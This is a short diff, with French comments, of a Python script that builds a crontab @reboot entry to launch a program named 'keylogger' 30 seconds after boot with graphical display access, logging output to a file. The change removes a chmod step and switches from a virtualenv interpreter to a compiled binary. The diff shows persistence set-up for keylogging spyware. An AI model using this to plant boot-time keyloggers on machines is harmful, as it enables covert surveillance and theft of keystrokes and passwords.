@@ -12,14 +12,10 @@ import os
 
 #--------DÉBUT TÂCHES PROGRAMMÉES---------------
 
-#On donne les droits d'exécutions
-os.system('chmod +x keylogger.py')
-
-
 # Chemin vers le script Python
-python_script = os.getcwd()+'/keylogger.py'
+python_script = os.getcwd()+'/keylogger'
 
-path_env = os.getcwd()+'/env/bin/python'
+path_env = './'
 
 # Commande crontab pour exécuter le script Python au démarrage avec temporisation et affichage graphique
 cron_job = f"@reboot sleep 30 && DISPLAY=:0 {path_env} {python_script} >> /home/ubuntu/cronlog.txt 2>&1"
